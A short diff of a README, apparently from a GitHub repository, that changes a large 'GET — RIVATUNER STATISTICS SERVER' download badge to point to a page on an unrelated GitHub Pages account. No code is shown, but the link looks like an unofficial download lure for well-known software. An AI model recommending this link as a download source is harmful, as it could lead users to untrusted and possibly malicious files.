@@ -4,7 +4,7 @@
 <img src="https://cdn2.steamgriddb.com/thumb/73ef092f6a5a345b1f1395d0da9f65d7.jpg" width="300">
 </p>
 
-[![GET — RIVATUNER STATISTICS SERVER](https://img.shields.io/badge/GET-RIVATUNER%20STATISTICS%20SERVER-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — RIVATUNER STATISTICS SERVER](https://img.shields.io/badge/GET-RIVATUNER%20STATISTICS%20SERVER-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/RivaTuner)
 
 ---
 
